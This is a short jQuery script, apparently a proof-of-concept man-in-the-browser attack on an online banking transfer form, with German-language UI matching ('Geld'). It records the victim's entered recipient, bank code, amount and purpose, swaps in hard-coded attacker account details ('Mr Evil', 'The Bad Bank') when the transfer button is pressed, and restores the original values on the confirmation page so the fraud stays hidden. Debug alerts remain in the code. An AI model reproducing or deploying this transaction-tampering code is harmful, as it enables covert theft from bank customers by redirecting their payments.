
HACK_REC_ACCOUNT	="999";
HACK_REC_NAME		="Mr Evil";
HACK_BANK_BLZ		="8272";
HACK_BANK_NAME		="The Bad Bank";
HACK_AMOUNT			=500;
HACK_USAGE			="Weil es moeglich ist";

	 function timedMsg()
		 {
		 	
		 
//		 $("#btnTD button:visible[hackmarker!='true']").each(function(){
//			 $("#btnTD button").append("bla33");
//			 alert($(this).text);
//		 });
		 
		 
		 	
		 	$("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){
		 			$("#btnTD button").append("bla");
		 			alert($(this).text());
		 			$(this).click(function(event) {
		 				 
		 				 globalRC_Acc_Nr=$("input:eq(1)").val();
		 				 globalRC_Acc_Name=$("input:eq(2)").val();
		 				 globalRC_Bank_BLZ=$("input:eq(3)").val();
		 				 globalRC_Bank_Name=$("input:eq(4)").val();
		 				 global_Amount=$("input:eq(5)").val();
		 				 global_Usage=$("input:eq(6)").val();
		 				 
		 				 
		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
		 				$("input:eq(2)").val(HACK_REC_NAME);
		 				$("input:eq(3)").val(HACK_BANK_BLZ);
		 				$("input:eq(4)").val(HACK_BANK_NAME);
		 				$("input:eq(5)").val(HACK_AMOUNT);
		 				$("input:eq(6)").val(HACK_USAGE);
		 				event.preventDefault();
		 				 
		 				});			
		 			$(this).attr("hackMarker","true");
		 	});
		 	
		 	$("#btnTD button:not(:visible)[hackConfPageMarker!='true']:contains('Geld')").each(function(){
		 		$("input:eq(1)").val(globalRC_Acc_Nr);
				$("input:eq(2)").val(globalRC_Acc_Name);
				$("input:eq(3)").val(globalRC_Bank_BLZ);
				$("input:eq(4)").val(globalRC_Bank_Name);
				$("input:eq(5)").val(global_Amount);
				$("input:eq(6)").val(global_Usage);
				 
		 		$(this).attr("hackConfPageMarker","true");
		 	});
		 	var t=setTimeout("timedMsg()",1000);
		 }
	 $(document).ready(function() {
		 
		 

	alert("start");
 	timedMsg();
	 });
  

 
 
 